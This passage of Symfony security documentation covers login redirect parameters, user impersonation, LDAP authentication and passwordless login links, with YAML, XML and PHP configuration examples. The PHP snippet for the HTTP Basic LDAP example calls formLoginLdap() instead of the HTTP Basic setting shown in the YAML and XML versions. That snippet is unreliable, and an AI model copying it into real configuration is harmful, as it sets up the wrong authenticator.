-----------------------------------------------------

The name of the request attributes used to define the success and failure login
redirects can be customized using the  ``target_path_parameter`` and
``failure_path_parameter`` options of the firewall that defines the login form.

.. configuration-block::

    .. code-block:: yaml

        # config/packages/security.yaml
        security:
            # ...

            firewalls:
                main:
                    # ...
                    form_login:
                        target_path_parameter: go_to
                        failure_path_parameter: back_to

    .. code-block:: xml

        <!-- config/packages/security.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <srv:container xmlns="http://symfony.com/schema/dic/security"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:srv="http://symfony.com/schema/dic/services"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/security
                https://symfony.com/schema/dic/security/security-1.0.xsd">

            <config>
                <!-- ... -->

                <firewall name="main">
                    <!-- ... -->
                    <form-login target-path-parameter="go_to"/>
                    <form-login failure-path-parameter="back_to"/>
                </firewall>
            </config>
        </srv:container>

    .. code-block:: php

        // config/packages/security.php
        use Symfony\Config\SecurityConfig;

        return static function (SecurityConfig $security): void {
            // ...

            $security->firewall('main')
                // ...
                ->formLogin()
                    // ...
                    ->targetPathParameter('go_to')
                    ->failurePathParameter('back_to')
            ;
        };

Using the above configuration, the query string parameters and hidden form fields
are now fully customized:

.. code-block:: text

    http://example.com/some/path?go_to=/dashboard&back_to=/forgot-password

.. code-block:: html+twig

    {# templates/security/login.html.twig #}
    <form action="{{ path('login') }}" method="post">
        {# ... #}

        <input type="hidden" name="go_to" value="{{ path('dashboard') }}">
        <input type="hidden" name="back_to" value="{{ path('forgot_password') }}">
        <input type="submit" name="login">
    </form>
How to Impersonate a User
=========================

Sometimes, it's useful to be able to switch from one user to another without
having to log out and log in again (for instance when you are debugging something
a user sees that you can't reproduce).

.. caution::

    User impersonation is not compatible with some authentication mechanisms
    (e.g. ``REMOTE_USER``) where the authentication information is expected to be
    sent on each request.

Impersonating the user can be done by activating the ``switch_user`` firewall
listener:

.. configuration-block::

    .. code-block:: yaml

        # config/packages/security.yaml
        security:
            # ...

            firewalls:
                main:
                    # ...
                    switch_user: true

    .. code-block:: xml

        <!-- config/packages/security.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <srv:container xmlns="http://symfony.com/schema/dic/security"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:srv="http://symfony.com/schema/dic/services"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/security
                https://symfony.com/schema/dic/security/security-1.0.xsd">

            <config>
                <!-- ... -->

                <firewall name="main">
                    <!-- ... -->
                    <switch-user/>
                </firewall>
            </config>
        </srv:container>

    .. code-block:: php

        // config/packages/security.php
        use Symfony\Config\SecurityConfig;

        return static function (SecurityConfig $security): void {
            // ...
            $security->firewall('main')
                // ...
                ->switchUser()
            ;
        };

To switch to another user, add a query string with the ``_switch_user``
parameter and the username (or whatever field our user provider uses to load users)
as the value to the current URL:

.. code-block:: text

    http://example.com/somewhere?_switch_user=thomas

.. tip::

    You can leverage the Twig function ``impersonation_path('thomas')``

.. tip::

    Instead of adding a ``_switch_user`` query string parameter, you can pass
    the username in a custom HTTP header by adjusting the ``parameter`` setting.
    For example, to use ``X-Switch-User`` header (available in PHP as
    ``HTTP_X_SWITCH_USER``) add this configuration:

    .. configuration-block::

        .. code-block:: yaml

            # config/packages/security.yaml
            security:
                # ...
                firewalls:
                    main:
                        # ...
                        switch_user: { parameter: X-Switch-User }

        .. code-block:: xml

            <!-- config/packages/security.xml -->
            <?xml version="1.0" encoding="UTF-8" ?>
            <srv:container xmlns="http://symfony.com/schema/dic/security"
                xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
                xmlns:srv="http://symfony.com/schema/dic/services"
                xsi:schemaLocation="http://symfony.com/schema/dic/services
                    https://symfony.com/schema/dic/services/services-1.0.xsd
                    http://symfony.com/schema/dic/security
                    https://symfony.com/schema/dic/security/security-1.0.xsd">
                <config>
                    <!-- ... -->
                    <firewall name="main">
                        <!-- ... -->
                        <switch-user parameter="X-Switch-User"/>
                    </firewall>
                </config>
            </srv:container>

        .. code-block:: php

            // config/packages/security.php
            use Symfony\Config\SecurityConfig;
            return static function (SecurityConfig $security): void {
                // ...
                $security->firewall('main')
                    // ...
                    ->switchUser()
                        ->parameter('X-Switch-User')
                ;
            };

To switch back to the original user, use the special ``_exit`` username:

.. code-block:: text

    http://example.com/somewhere?_switch_user=_exit

.. tip::

    You can leverage the Twig function ``impersonation_exit_path('/somewhere')``

This feature is only available to users with a special role called ``ROLE_ALLOWED_TO_SWITCH``.
Using :ref:`role_hierarchy <security-role-hierarchy>` is a great way to give this
role to the users that need it.

Knowing When Impersonation Is Active
------------------------------------

You can use the special attribute ``IS_IMPERSONATOR`` to check if the
impersonation is active in this session. Use this special role, for
instance, to show a link to exit impersonation in a template:

.. code-block:: html+twig

    {% if is_granted('IS_IMPERSONATOR') %}
        <a href="{{ impersonation_exit_path(path('homepage') ) }}">Exit impersonation</a>
    {% endif %}

Finding the Original User
-------------------------

In some cases, you may need to get the object that represents the impersonator
user rather than the impersonated user. When a user is impersonated the token
stored in the token storage will be a ``SwitchUserToken`` instance. Use the
following snippet to obtain the original token which gives you access to
the impersonator user::

    // src/Service/SomeService.php
    namespace App\Service;

    use Symfony\Bundle\SecurityBundle\Security;
    use Symfony\Component\Security\Core\Authentication\Token\SwitchUserToken;
    // ...

    class SomeService
    {
        public function __construct(
            private Security $security,
        ) {
        }

        public function someMethod(): void
        {
            // ...

            $token = $this->security->getToken();

            if ($token instanceof SwitchUserToken) {
                $impersonatorUser = $token->getOriginalToken()->getUser();
            }

            // ...
        }
    }

Controlling the Query Parameter
-------------------------------

This feature needs to be available only to a restricted group of users.
By default, access is restricted to users having the ``ROLE_ALLOWED_TO_SWITCH``
role. The name of this role can be modified via the ``role`` setting. You can
also adjust the query parameter name via the ``parameter`` setting:

.. configuration-block::

    .. code-block:: yaml

        # config/packages/security.yaml
        security:
            # ...

            firewalls:
                main:
                    # ...
                    switch_user: { role: ROLE_ADMIN, parameter: _want_to_be_this_user }

    .. code-block:: xml

        <!-- config/packages/security.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <srv:container xmlns="http://symfony.com/schema/dic/security"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:srv="http://symfony.com/schema/dic/services"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/security
                https://symfony.com/schema/dic/security/security-1.0.xsd">
            <config>
                <!-- ... -->

                <firewall name="main">
                    <!-- ... -->
                    <switch-user role="ROLE_ADMIN" parameter="_want_to_be_this_user"/>
                </firewall>
            </config>
        </srv:container>

    .. code-block:: php

        // config/packages/security.php
        use Symfony\Config\SecurityConfig;

        return static function (SecurityConfig $security): void {
            // ...
            $security->firewall('main')
                // ...
                ->switchUser()
                    ->role('ROLE_ADMIN')
                    ->parameter('_want_to_be_this_user')
            ;
        };

Redirecting to a Specific Target Route
--------------------------------------

.. note::

    It works only in a stateful firewall.

This feature allows you to control the redirection target route via ``target_route``.

.. configuration-block::

    .. code-block:: yaml

        # config/packages/security.yaml
        security:
            # ...

            firewalls:
                main:
                    # ...
                    switch_user: { target_route: app_user_dashboard }

    .. code-block:: xml

        <!-- config/packages/security.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <srv:container xmlns="http://symfony.com/schema/dic/security"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:srv="http://symfony.com/schema/dic/services"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/security
                https://symfony.com/schema/dic/security/security-1.0.xsd">
            <config>
                <!-- ... -->

                <firewall name="main">
                    <!-- ... -->
                    <switch-user target-route="app_user_dashboard"/>
                </firewall>
            </config>
        </srv:container>

    .. code-block:: php

        // config/packages/security.php
        use Symfony\Config\SecurityConfig;

        return static function (SecurityConfig $security): void {
            // ...
            $security->firewall('main')
                // ...
                ->switchUser()
                    ->targetRoute('app_user_dashboard')
            ;
        };

Limiting User Switching
-----------------------

If you need more control over user switching, you can use a security voter. First,
configure ``switch_user`` to check for some new, custom attribute. This can be
anything, but *cannot* start with ``ROLE_`` (to enforce that only your voter will
be called):

.. configuration-block::

    .. code-block:: yaml

        # config/packages/security.yaml
        security:
            # ...

            firewalls:
                main:
                    # ...
                    switch_user: { role: CAN_SWITCH_USER }

    .. code-block:: xml

        <!-- config/packages/security.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <srv:container xmlns="http://symfony.com/schema/dic/security"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:srv="http://symfony.com/schema/dic/services"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/security
                https://symfony.com/schema/dic/security/security-1.0.xsd">
            <config>
                <!-- ... -->

                <firewall name="main">
                    <!-- ... -->
                    <switch-user role="CAN_SWITCH_USER"/>
                </firewall>
            </config>
        </srv:container>

    .. code-block:: php

        // config/packages/security.php
        use Symfony\Config\SecurityConfig;

        return static function (SecurityConfig $security): void {
            // ...
            $security->firewall('main')
                // ...
                ->switchUser()
                    ->role('CAN_SWITCH_USER')
            ;
        };

Then, create a voter class that responds to this role and includes whatever custom
logic you want::

    // src/Security/Voter/SwitchToCustomerVoter.php
    namespace App\Security\Voter;

    use Symfony\Bundle\SecurityBundle\Security;
    use Symfony\Component\Security\Core\Authentication\Token\TokenInterface;
    use Symfony\Component\Security\Core\Authorization\Voter\Voter;
    use Symfony\Component\Security\Core\User\UserInterface;

    class SwitchToCustomerVoter extends Voter
    {
        public function __construct(
            private Security $security,
        ) {
        }

        protected function supports($attribute, $subject): bool
        {
            return in_array($attribute, ['CAN_SWITCH_USER'])
                && $subject instanceof UserInterface;
        }

        protected function voteOnAttribute($attribute, $subject, TokenInterface $token): bool
        {
            $user = $token->getUser();
            // if the user is anonymous or if the subject is not a user, do not grant access
            if (!$user instanceof UserInterface || !$subject instanceof UserInterface) {
                return false;
            }

            // you can still check for ROLE_ALLOWED_TO_SWITCH
            if ($this->security->isGranted('ROLE_ALLOWED_TO_SWITCH')) {
                return true;
            }

            // check for any roles you want
            if ($this->security->isGranted('ROLE_TECH_SUPPORT')) {
                return true;
            }

            /*
             * or use some custom data from your User object
            if ($user->isAllowedToSwitch()) {
                return true;
            }
            */

            return false;
        }
    }

That's it! When switching users, your voter now has full control over whether or
not this is allowed. If your voter isn't called, see :ref:`declaring-the-voter-as-a-service`.

Events
------

the ``security.switch_user`` event is dispatched just before the impersonation
is fully completed. Your :doc:`listener or subscriber </event_dispatcher>` will
receive a :class:`Symfony\\Component\\Security\\Http\\Event\\SwitchUserEvent`,
which you can use to get the user that you are now impersonating.

This event is also dispatched just before impersonation is fully exited. You can
use it to get the original impersonator user.

The :ref:`locale-sticky-session` section does not update the locale when you
impersonate a user. If you *do* want to be sure to update the locale when you
switch users, add an event subscriber on this event::

    // src/EventListener/SwitchUserSubscriber.php
    namespace App\EventListener;

    use Symfony\Component\EventDispatcher\EventSubscriberInterface;
    use Symfony\Component\Security\Http\Event\SwitchUserEvent;
    use Symfony\Component\Security\Http\SecurityEvents;

    class SwitchUserSubscriber implements EventSubscriberInterface
    {
        public function onSwitchUser(SwitchUserEvent $event): void
        {
            $request = $event->getRequest();

            if ($request->hasSession() && ($session = $request->getSession())) {
                $session->set(
                    '_locale',
                    // assuming your User has some getLocale() method
                    $event->getTargetUser()->getLocale()
                );
            }
        }

        public static function getSubscribedEvents(): array
        {
            return [
                // constant for security.switch_user
                SecurityEvents::SWITCH_USER => 'onSwitchUser',
            ];
        }
    }

That's it! If you're using the :ref:`default services.yaml configuration <service-container-services-load-example>`,
Symfony will automatically discover your service and call ``onSwitchUser`` whenever
a switch user occurs.

For more details about event subscribers, see :doc:`/event_dispatcher`.
Authenticating against an LDAP server
=====================================

Symfony provides different means to work with an LDAP server.

The Security component offers:

* The ``ldap`` :doc:`user provider </security/user_providers>`, using the
  :class:`Symfony\\Component\\Ldap\\Security\\LdapUserProvider`
  class. Like all other user providers, it can be used with any
  authentication provider.

* The ``form_login_ldap`` authentication provider, for authenticating
  against an LDAP server using a login form. Like all other
  authentication providers, it can be used with any user provider.

* The ``http_basic_ldap`` authentication provider, for authenticating
  against an LDAP server using HTTP Basic. Like all other
  authentication providers, it can be used with any user provider.

This means that the following scenarios will work:

* Checking a user's password and fetching user information against an
  LDAP server. This can be done using both the LDAP user provider and
  either the LDAP form login or LDAP HTTP Basic authentication providers.

* Checking a user's password against an LDAP server while fetching user
  information from another source (database using FOSUserBundle, for
  example).

* Loading user information from an LDAP server, while using another
  authentication strategy (token-based pre-authentication, for example).

Installation
------------

In applications using :ref:`Symfony Flex <symfony-flex>`, run this command to
install the Ldap component before using it:

.. code-block:: terminal

    $ composer require symfony/ldap

Ldap Configuration Reference
----------------------------

See :doc:`/reference/configuration/security` for the full LDAP
configuration reference (``form_login_ldap``, ``http_basic_ldap``, ``ldap``).
Some of the more interesting options are explained below.

Configuring the LDAP client
---------------------------

All mechanisms actually need an LDAP client previously configured.
The providers are configured to use a default service named ``ldap``,
but you can override this setting in the security component's
configuration.

An LDAP client can be configured using the built-in
`LDAP PHP extension`_ with the following service definition:

.. configuration-block::

    .. code-block:: yaml

        # config/services.yaml
        services:
            Symfony\Component\Ldap\Ldap:
                arguments: ['@Symfony\Component\Ldap\Adapter\ExtLdap\Adapter']
                tags:
                    - ldap
            Symfony\Component\Ldap\Adapter\ExtLdap\Adapter:
                arguments:
                    -   host: my-server
                        port: 389
                        encryption: tls
                        options:
                            protocol_version: 3
                            referrals: false

    .. code-block:: xml

        <!-- config/services.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/services https://symfony.com/schema/dic/services/services-1.0.xsd">

            <services>
                <service id="Symfony\Component\Ldap\Ldap">
                    <argument type="service" id="Symfony\Component\Ldap\Adapter\ExtLdap\Adapter"/>
                    <tag name="ldap"/>
                </service>
                <service id="Symfony\Component\Ldap\Adapter\ExtLdap\Adapter">
                    <argument type="collection">
                        <argument key="host">my-server</argument>
                        <argument key="port">389</argument>
                        <argument key="encryption">tls</argument>
                        <argument key="options" type="collection">
                            <argument key="protocol_version">3</argument>
                            <argument key="referrals">false</argument>
                        </argument>
                    </argument>
                </service>
            </services>
        </container>

    .. code-block:: php

        // config/services.php
        use Symfony\Component\Ldap\Adapter\ExtLdap\Adapter;
        use Symfony\Component\Ldap\Ldap;

        $container->register(Ldap::class)
            ->addArgument(new Reference(Adapter::class))
            ->tag('ldap');

        $container
            ->register(Adapter::class)
            ->setArguments([
                'host' => 'my-server',
                'port' => 389,
                'encryption' => 'tls',
                'options' => [
                    'protocol_version' => 3,
                    'referrals' => false
                ],
            ]);

.. _security-ldap-user-provider:

Fetching Users Using the LDAP User Provider
-------------------------------------------

If you want to fetch user information from an LDAP server, you may want to
use the ``ldap`` user provider.

.. configuration-block::

    .. code-block:: yaml

        # config/packages/security.yaml
        security:
            # ...

            providers:
                my_ldap:
                    ldap:
                        service: Symfony\Component\Ldap\Ldap
                        base_dn: dc=example,dc=com
                        search_dn: "cn=read-only-admin,dc=example,dc=com"
                        search_password: password
                        default_roles: ROLE_USER
                        uid_key: uid
                        extra_fields: ['email']

    .. code-block:: xml

        <!-- config/packages/security.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <srv:container xmlns="http://symfony.com/schema/dic/security"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:srv="http://symfony.com/schema/dic/services"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/security
                https://symfony.com/schema/dic/security/security-1.0.xsd">

            <config>
                <provider name="my_ldap">
                    <ldap service="Symfony\Component\Ldap\Ldap"
                        base-dn="dc=example,dc=com"
                        search-dn="cn=read-only-admin,dc=example,dc=com"
                        search-password="password"
                        default-roles="ROLE_USER"
                        uid-key="uid"/>
                </provider>
            </config>
        </srv:container>

    .. code-block:: php

        // config/packages/security.php
        use Symfony\Component\Ldap\Ldap;
        use Symfony\Config\SecurityConfig;

        return static function (SecurityConfig $security): void {
            $security->provider('ldap_users')
                ->ldap()
                    ->service(Ldap::class)
                    ->baseDn('dc=example,dc=com')
                    ->searchDn('cn=read-only-admin,dc=example,dc=com')
                    ->searchPassword('password')
                    ->defaultRoles(['ROLE_USER'])
                    ->uidKey('uid')
                    ->extraFields(['email'])
            ;
        };

.. caution::

    The Security component escapes provided input data when the LDAP user
    provider is used. However, the LDAP component itself does not provide
    any escaping yet. Thus, it's your responsibility to prevent LDAP injection
    attacks when using the component directly.

.. caution::

    The user configured above in the user provider is only used to retrieve
    data. It's a static user defined by its username and password (for improved
    security, define the password as an environment variable).

    If your LDAP server allows retrieval of information anonymously, you can
    set the ``search_dn`` and ``search_password`` options to ``null``.

The ``ldap`` user provider supports many different configuration options:

service
.......

**type**: ``string`` **default**: ``ldap``

This is the name of your configured LDAP client. You can freely choose the
name, but it must be unique in your application and it cannot start with a
number or contain white spaces.

base_dn
.......

**type**: ``string`` **default**: ``null``

This is the base DN for the directory

search_dn
.........

**type**: ``string`` **default**: ``null``

This is your read-only user's DN, which will be used to authenticate
against the LDAP server to fetch the user's information.

search_password
...............

**type**: ``string`` **default**: ``null``

This is your read-only user's password, which will be used to authenticate
against the LDAP server to fetch the user's information.

default_roles
.............

**type**: ``array`` **default**: ``[]``

This is the default role you wish to give to a user fetched from the LDAP
server. If you do not configure this key, your users won't have any roles,
and will not be considered as authenticated fully.

uid_key
.......

**type**: ``string`` **default**: ``null``

This is the entry's key to use as its UID. Depends on your LDAP server
implementation. Commonly used values are:

* ``sAMAccountName`` (default)
* ``userPrincipalName``
* ``uid``

If you pass ``null`` as the value of this option, the default UID key is used
``sAMAccountName``.

extra_fields
............

**type**: ``array`` **default**: ``null``

Defines the custom fields to pull from the LDAP server. If any field does not
exist, an ``\InvalidArgumentException`` will be thrown.

filter
......

**type**: ``string`` **default**: ``null``

This key lets you configure which LDAP query will be used. The ``{uid_key}``
string will be replaced by the value of the ``uid_key`` configuration value
(by default, ``sAMAccountName``), and the ``{user_identifier}`` string will be
replaced by the user identified you are trying to load.

For example, with a ``uid_key`` of ``uid``, and if you are trying to
load the user ``fabpot``, the final string will be: ``(uid=fabpot)``.

If you pass ``null`` as the value of this option, the default filter is used
``({uid_key}={user_identifier})``.

To prevent `LDAP injection`_, the username will be escaped.

The syntax for the ``filter`` key is defined by `RFC4515`_.

Authenticating against an LDAP server
-------------------------------------

Authenticating against an LDAP server can be done using either the form
login or the HTTP Basic authentication providers.

They are configured exactly as their non-LDAP counterparts, with the
addition of two configuration keys and one optional key:

service
.......

**type**: ``string`` **default**: ``ldap``

This is the name of your configured LDAP client. You can freely choose the
name, but it must be unique in your application and it cannot start with a
number or contain white spaces.

dn_string
.........

**type**: ``string`` **default**: ``{user_identifier}``

This key defines the form of the string used to compose the
DN of the user, from the username. The ``{user_identifier}`` string is
replaced by the actual username of the person trying to authenticate.

For example, if your users have DN strings in the form
``uid=einstein,dc=example,dc=com``, then the ``dn_string`` will be
``uid={user_identifier},dc=example,dc=com``.

query_string
............

**type**: ``string`` **default**: ``null``

This (optional) key makes the user provider search for a user and then use the
found DN for the bind process. This is useful when using multiple LDAP user
providers with different ``base_dn``. The value of this option must be a valid
search string (e.g. ``uid="{user_identifier}"``). The placeholder value will be
replaced by the actual user identifier.

When this option is used, ``query_string`` will search in the DN specified by
``dn_string`` and the DN resulted of the ``query_string`` will be used to
authenticate the user with their password. Following the previous example, if
your users have the following two DN: ``dc=companyA,dc=example,dc=com`` and
``dc=companyB,dc=example,dc=com``, then ``dn_string`` should be
``dc=example,dc=com``.

Bear in mind that usernames must be unique across both DN, as the authentication
provider won't be able to select the correct user for the bind process if more
than one is found.

Examples are provided below, for both ``form_login_ldap`` and
``http_basic_ldap``.

Configuration example for form login
....................................

.. configuration-block::

    .. code-block:: yaml

        # config/packages/security.yaml
        security:
            # ...

            firewalls:
                main:
                    # ...
                    form_login_ldap:
                        # ...
                        service: Symfony\Component\Ldap\Ldap
                        dn_string: 'uid={user_identifier},dc=example,dc=com'

    .. code-block:: xml

        <!-- config/packages/security.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <srv:container xmlns="http://symfony.com/schema/dic/security"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:srv="http://symfony.com/schema/dic/services"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/security
                https://symfony.com/schema/dic/security/security-1.0.xsd">

            <config>
                <firewall name="main">
                    <form-login-ldap service="Symfony\Component\Ldap\Ldap"
                        dn-string="uid={user_identifier},dc=example,dc=com"/>
                </firewall>
            </config>
        </srv:container>

    .. code-block:: php

        // config/packages/security.php
        use Symfony\Component\Ldap\Ldap;
        use Symfony\Config\SecurityConfig;

        return static function (SecurityConfig $security): void {
            $security->firewall('main')
                ->formLoginLdap()
                    ->service(Ldap::class)
                    ->dnString('uid={user_identifier},dc=example,dc=com')
            ;
        };

Configuration example for HTTP Basic
....................................

.. configuration-block::

    .. code-block:: yaml

        # config/packages/security.yaml
        security:
            # ...

            firewalls:
                main:
                    stateless: true
                    http_basic_ldap:
                        service: Symfony\Component\Ldap\Ldap
                        dn_string: 'uid={user_identifier},dc=example,dc=com'

    .. code-block:: xml

        <!-- config/packages/security.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <srv:container xmlns="http://symfony.com/schema/dic/security"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:srv="http://symfony.com/schema/dic/services"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/security
                https://symfony.com/schema/dic/security/security-1.0.xsd">

            <config>
                <!-- ... -->

                <firewall name="main" stateless="true">
                    <http-basic-ldap service="Symfony\Component\Ldap\Ldap"
                        dn-string="uid={user_identifier},dc=example,dc=com"/>
                </firewall>
            </config>
        </srv:container>

    .. code-block:: php

        // config/packages/security.php
        use Symfony\Component\Ldap\Ldap;
        use Symfony\Config\SecurityConfig;

        return static function (SecurityConfig $security): void {
            $security->firewall('main')
                ->stateless(true)
                ->formLoginLdap()
                    ->service(Ldap::class)
                    ->dnString('uid={user_identifier},dc=example,dc=com')
            ;
        };

Configuration example for form login and query_string
.....................................................

.. configuration-block::

    .. code-block:: yaml

        # config/packages/security.yaml
        security:
            # ...

            firewalls:
                main:
                    # ...
                    form_login_ldap:
                        service: Symfony\Component\Ldap\Ldap
                        dn_string: 'dc=example,dc=com'
                        query_string: '(&(uid={user_identifier})(memberOf=cn=users,ou=Services,dc=example,dc=com))'
                        search_dn: '...'
                        search_password: 'the-raw-password'

    .. code-block:: xml

        <!-- config/packages/security.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <srv:container xmlns="http://symfony.com/schema/dic/security"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:srv="http://symfony.com/schema/dic/services"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/security
                https://symfony.com/schema/dic/security/security-1.0.xsd">

            <config>
                <firewall name="main">
                    <!-- ... -->
                    <form-login-ldap service="Symfony\Component\Ldap\Ldap"
                        dn-string="dc=example,dc=com"
                        query-string="(&amp;(uid={user_identifier})(memberOf=cn=users,ou=Services,dc=example,dc=com))"
                        search-dn="..."
                        search-password="the-raw-password"/>
                </firewall>
            </config>
        </srv:container>

    .. code-block:: php

        // config/packages/security.php
        use Symfony\Component\Ldap\Ldap;
        use Symfony\Config\SecurityConfig;

        return static function (SecurityConfig $security): void {
            $security->firewall('main')
                ->stateless(true)
                ->formLoginLdap()
                    ->service(Ldap::class)
                    ->dnString('dc=example,dc=com')
                    ->queryString('(&(uid={user_identifier})(memberOf=cn=users,ou=Services,dc=example,dc=com))')
                    ->searchDn('...')
                    ->searchPassword('the-raw-password')
            ;
        };

.. _`LDAP PHP extension`: https://www.php.net/manual/en/intro.ldap.php
.. _`RFC4515`: https://datatracker.ietf.org/doc/rfc4515/
.. _`LDAP injection`: http://projects.webappsec.org/w/page/13246947/LDAP%20Injection
How to use Passwordless Login Link Authentication
=================================================

Login links, also called "magic links", are a passwordless authentication
mechanism. Whenever a user wants to login, a new link is generated and sent to
them (e.g. using an email). The link fully authenticates the user in the
application when clicking on it.

This authentication method can help you eliminate most of the customer support
related to authentication (e.g. I forgot my password, how can I change or reset
my password, etc.)

Using the Login Link Authenticator
----------------------------------

This guide assumes you have :doc:`setup security and have created a user object </security>`
in your application.

1) Configure the Login Link Authenticator
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

The login link authenticator is configured using the ``login_link`` option
under the firewall and requires defining two options called ``check_route``
and ``signature_properties`` (explained below):

.. configuration-block::

    .. code-block:: yaml

        # config/packages/security.yaml
        security:
            firewalls:
                main:
                    login_link:
                        check_route: login_check
                        signature_properties: ['id']

    .. code-block:: xml

        <!-- config/packages/security.xml -->
        <?xml version="1.0" encoding="UTF-8"?>
        <srv:container xmlns="http://symfony.com/schema/dic/security"
            xmlns:srv="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/security
                https://symfony.com/schema/dic/security/security-1.0.xsd">

            <config>
                <firewall name="main">
                    <login-link check-route="login_check">
                        <signature-property>id</signature-property>
                    </login-link>
                </firewall>
            </config>
        </srv:container>

    .. code-block:: php

        // config/packages/security.php
        use Symfony\Config\SecurityConfig;

        return static function (SecurityConfig $security): void {
            $security->firewall('main')
                ->loginLink()
                    ->checkRoute('login_check')
                    ->signatureProperties(['id'])
            ;
        };

The ``signature_properties`` are used to create a signed URL. This must
contain at least one property of your ``User`` object that uniquely
identifies this user (e.g. the user ID). Read more about this setting
:ref:`further down below <security-login-link-signature>`.

The ``check_route`` must be the name of an existing route and it will be used to
generate the login link that will authenticate the user. You don't need a
controller (or it can be empty) because the login link authenticator will
intercept requests to this route:

.. configuration-block::

    .. code-block:: php-attributes

        // src/Controller/SecurityController.php
        namespace App\Controller;

        use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
        use Symfony\Component\Routing\Attribute\Route;

        class SecurityController extends AbstractController
        {
            #[Route('/login_check', name: 'login_check')]
            public function check(): never
            {
                throw new \LogicException('This code should never be reached');
            }
        }

    .. code-block:: yaml

        # config/routes.yaml

        # ...
        login_check:
            path: /login_check

    .. code-block:: xml

        <!-- config/routes.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <routes xmlns="http://symfony.com/schema/routing"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/routing
                https://symfony.com/schema/routing/routing-1.0.xsd">

            <!-- ... -->
            <route id="login_check" path="/login_check"/>
        </routes>

    .. code-block:: php

        // config/routes.php
        use App\Controller\DefaultController;
        use Symfony\Component\Routing\Loader\Configurator\RoutingConfigurator;

        return function (RoutingConfigurator $routes): void {
            // ...
            $routes->add('login_check', '/login_check');
        };

2) Generate the Login Link
~~~~~~~~~~~~~~~~~~~~~~~~~~

Now that the authenticator is able to check the login links, you can
create a page where a user can request a login link.

The login link can be generated using the
:class:`Symfony\\Component\\Security\\Http\\LoginLink\\LoginLinkHandlerInterface`.
The correct login link handler is autowired for you when type-hinting for
this interface::

    // src/Controller/SecurityController.php
    namespace App\Controller;

    use App\Repository\UserRepository;
    use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
    use Symfony\Component\HttpFoundation\Request;
    use Symfony\Component\HttpFoundation\Response;
    use Symfony\Component\Routing\Attribute\Route;
    use Symfony\Component\Security\Http\LoginLink\LoginLinkHandlerInterface;

    class SecurityController extends AbstractController
    {
        #[Route('/login', name: 'login')]
        public function requestLoginLink(LoginLinkHandlerInterface $loginLinkHandler, UserRepository $userRepository, Request $request): Response
        {
            // check if form is submitted
            if ($request->isMethod('POST')) {
                // load the user in some way (e.g. using the form input)
                $email = $request->getPayload()->get('email');
                $user = $userRepository->findOneBy(['email' => $email]);

                // create a login link for $user this returns an instance
                // of LoginLinkDetails
                $loginLinkDetails = $loginLinkHandler->createLoginLink($user);
                $loginLink = $loginLinkDetails->getUrl();

                // ... send the link and return a response (see next section)
            }

            // if it's not submitted, render the form to request the "login link"
            return $this->render('security/request_login_link.html.twig');
        }

        // ...
    }

.. code-block:: html+twig

    {# templates/security/request_login_link.html.twig #}
    {% extends 'base.html.twig' %}

    {% block body %}
    <form action="{{ path('login') }}" method="POST">
        <input type="email" name="email">
        <button type="submit">Send Login Link</button>
    </form>
    {% endblock %}

In this controller, the user is submitting their email address to the
controller. Based on this property, the correct user is loaded and a login
link is created using
:method:`Symfony\\Component\\Security\\Http\\LoginLink\\LoginLinkHandlerInterface::createLoginLink`.

.. caution::

    It is important to send this link to the user and **not show it directly**,
    as that would allow anyone to login. For instance, use the
